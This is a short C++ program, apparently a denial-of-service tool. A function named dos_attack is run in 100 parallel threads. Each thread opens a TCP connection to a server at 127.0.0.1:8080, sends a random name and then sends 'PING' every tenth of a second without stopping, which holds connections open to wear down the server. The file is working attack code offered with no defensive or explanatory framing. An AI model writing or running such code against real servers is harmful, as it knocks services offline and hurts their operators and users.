#include <iostream>
#include <string>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <thread>
#include <cstdlib>
#include <ctime>
#include <vector>

#define PORT 8080
#define SERVER_IP "127.0.0.1"

std::string randname() {
    std::string name;
    for (int i = 0; i < 10; i++) {
        name += static_cast<char>(rand() % 26 + 97);
    }
    return name;
}

void dos_attack() { 
    int sock = 0;
    struct sockaddr_in serv_addr;

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        std::cerr << "Socket creation failed\n";
        return;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    if (inet_pton(AF_INET, SERVER_IP, &serv_addr.sin_addr) <= 0) {
        std::cerr << "Invalid address or address not supported\n";
        close(sock);
        return;
    }

    if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        std::cerr << "Connection failed\n";
        close(sock);
        return;
    }

    std::string name = randname();
    send(sock, name.c_str(), name.length(), 0);
    std::cout << "Name sent: " << name << std::endl;

    while (true) {
        std::string keepAliveMessage = "PING";
        send(sock, keepAliveMessage.c_str(), keepAliveMessage.length(), 0);
        usleep(100000);
    }
}

int main() {
    srand(static_cast<unsigned>(time(0)));

    std::vector<std::thread> threads;

    for (int i = 0; i < 100; i++) {
        threads.emplace_back(dos_attack);
    }

    for (auto& thread : threads) {
        thread.join();
    }

    return 0;
}
